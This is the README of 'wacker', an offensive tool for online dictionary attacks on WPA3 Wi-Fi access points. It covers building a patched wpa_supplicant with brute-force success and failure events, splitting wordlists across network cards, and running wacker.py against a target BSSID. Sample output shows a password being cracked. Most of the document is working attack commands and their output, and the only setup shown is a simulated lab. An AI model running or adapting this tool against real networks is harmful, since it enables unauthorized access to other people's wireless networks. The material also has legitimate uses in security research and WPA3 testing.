# Overview
A set of scripts to help perform an online dictionary attack against a WPA3 access point. Wacker leverages the wpa_supplicant control interface to control the operations of the supplicant daemon and to get status information and event notifications ultimately helping speedup connection attempts during brute force attempts.


# Find a WPA3 AP to use
If you already have a WPA3 AP that works then great. In lieu of that you can setup a local environment using mac80211_hwsim (details below) or use the VMs provided by the RF Hackers Sanctuary (highly recommended). Testing was done almost exculsively using the simulated mac80211 environments. Little attention was given to a real AP... for now... so your YMWV.

## Local Simulated Radios
To set up your own software simulator of 802.11 radios simply configure and load the correct mac80211_hwsim module.
```
# modprobe mac80211_hwsim radios=4
# iwconfig
wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan2     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan3     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

Choose one of the new interfaces as your WPA3 access point and use the following conf file.
```
# cat hostapd.conf
interface=wlan0
ssid=WCTF_18
driver=nl80211
hw_mode=g
channel=1
logger_syslog=-1
logger_syslog_level=3
wpa=2
wpa_passphrase=Aeromechanics
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=1
group_mgmt_cipher=AES-128-CMAC
```
And start hostapd with
```
# hostapd -K -dd hostapd.conf
```


# Split a wordlist
If you have intentions of farming out your cracking efforts across a series of nics the provided split.sh script will partition a wordlist for you.
```
# ./split.sh 10 cyberpunk.words 
  50916 cyberpunk.words.aaa
  50916 cyberpunk.words.aab
  50916 cyberpunk.words.aac
  50916 cyberpunk.words.aad
  50916 cyberpunk.words.aae
  50916 cyberpunk.words.aaf
  50916 cyberpunk.words.aag
  50916 cyberpunk.words.aah
  50916 cyberpunk.words.aai
  50907 cyberpunk.words.aaj
 509151 total
```


# Building wpa_supplicant
We're providing our own wpa_supplicant in order to guarantee that certain configurations are set as well as a few mods that need to occur within the source code itself. To build simply do the following. Hopefully in the future this will become a deprecated step.
```
# apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev
# cd wpa_supplicant-2.8/wpa_supplicant/
# cp defconfig_brute_force .config
# make -j4
# ls -al wpa_supplicant
-rwxr-xr-x 1 root root 13541416 May 31 16:30 wpa_supplicant
```
Of interest are a few new event messages that were added to the wpa supplicant control interface to help further distinguish outcomes the wacker script hooks.
```
/** auth success for our brute force stuff (WPA3) */
#define WPA_EVENT_BRUTE_SUCCESS "CTRL-EVENT-BRUTE-SUCCESS "
/** auth failure for our brute force stuff (WPA3) */
#define WPA_EVENT_BRUTE_FAILURE "CTRL-EVENT-BRUTE-FAILURE " 
```


# Python Requirement
The wacker.py script makes use of a few f-strings among other python3-isms. In the interest of releasing the code sooner this requirement was kept. Here are some generic install instructions for Python3.7 if needed. I know in the future this will become a deprecated step.

```
# apt-get install build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev -y
# wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz
# tar xf Python-3.7.0.tar.xz
# cd Python-3.7.0
# ./configure
# make -j4
# make altinstall
```


# Running wacker
The wacker.py script is intended to perform all the heavy lifting.
```
# ./wacker.py --help
usage: wacker.py [-h] --wordlist WORDLIST --interface INTERFACE --bssid BSSID
                 --ssid SSID --freq FREQ [--start START_WORD] [--debug]

A WPA3 dictionary cracker. Must run as root!

optional arguments:
  -h, --help            show this help message and exit
  --wordlist WORDLIST   wordlist to use
  --interface INTERFACE
                        interface to use
  --bssid BSSID         bssid of the target
  --ssid SSID           the ssid of the WPA3 AP
  --freq FREQ           frequency of the ap
  --start START_WORD    word to start with in the wordlist
  --debug               increase logging output
```
With any luck... running the attack using just one instance...
```
# ./wacker.py --wordlist cyberpunk.words --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2 --freq 2412
Start time: 21 Aug 2020 07:40:11
Starting wpa_supplicant...
    5795 / 509151   words (1.14%) :  79.41 words/sec : 0.020 hours lapsed :   1.76 hours to exhaust (21 Aug 2020 09:25:49)
Found the password: 'Aeromechanics'

Stop time: 21 Aug 2020 07:41:24
```

Running multiple instances of wacker is easy if you have the spare nics. Don't forget to parition the wordlist as well.
```
# ./wacker.py --wordlist cyberpunk.words.aaa --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan1 --freq 2412
# ./wacker.py --wordlist cyberpunk.words.aab --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan2 --freq 2412
# ./wacker.py --wordlist cyberpunk.words.aac --ssid WCTF_18 --bssid 02:00:00:00:00:00 --interface wlan3 --freq 2412
```

# Files of interest
wacker is quite verbose. Files of interest are found under <b>/tmp/wpa_supplicant/</b>
 - wlan1 : one end of the uds
 - wlan1_client : one end of the uds
 - wlan1.conf : initial wpa_supplicant conf needed
 - wlan1.log : supplicant output (only when using --debug option)
 - wlan1.pid : pid file for the wpa_supplciant instance
 - wlan1_wacker.log : wacker debug output


# Caution
wacker doesn't handle acls put in place by the target WPA3 AP. Meaning, the current code always uses the same MAC address. If the target AP blacklists our MAC address then the script won't differentiate between a true auth failure and our blacklisted MAC being rejected. This will mean that we'll consider the true password as a failure. One way to solve.... we would have to add macchanger to the source at the expense of slowdown.

wacker will seemingly pause everything so often as the AP will issue a backoff timeout. This will cause metric display to seemingly pause and then start again. This is expected behavior.

# Common Problems
* You'll see this when your client driver doesn't support the correct AKM. Typically this manifests itself in the wpa_supplicant output after you try and run the wacker script. The supplicant will essentially hang waiting further instructions with the AKM issue detailed below. The needed AKM is 00-0F-AC:8 (SAE) in the cases of WPA3.

```
u631_3: WPA: AP group 0x10 network profile group 0x18; available group 0x10
u631_3: WPA: using GTK CCMP
u631_3: WPA: AP pairwise 0x10 network profile pairwise 0x18; available pairwise 0x10
u631_3: WPA: using PTK CCMP
u631_3: WPA: AP key_mgmt 0x400 network profile key_mgmt 0x400; available key_mgmt 0x400
u631_3: WPA: Failed to select authenticated key management type
u631_3: WPA: Failed to set WPA key management and encryption suites
```


# TODO
* Create a wrapper script to launch wacker across multiple nics. This will avoid having to instantiate wacker manually for each nic. Have the wrapper also split the wordlist and consolidate the stats.
